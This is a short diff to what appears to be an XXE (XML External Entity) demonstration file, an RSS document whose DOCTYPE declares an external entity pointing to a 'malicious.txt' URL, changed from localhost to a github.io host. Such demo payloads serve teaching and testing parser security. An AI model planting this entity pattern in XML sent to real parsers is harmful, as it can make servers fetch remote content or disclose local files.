@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
  <!DOCTYPE foo [  
    <!ELEMENT foo ANY >
-     <!ENTITY xxe SYSTEM "http://localhost/xxedemo/malicious.txt" >]>
+     <!ENTITY xxe SYSTEM "http://tonvanbart.github.io/xxedemo/malicious.txt" >]>
 	 <rss version="2.0">
 
 	 <channel>
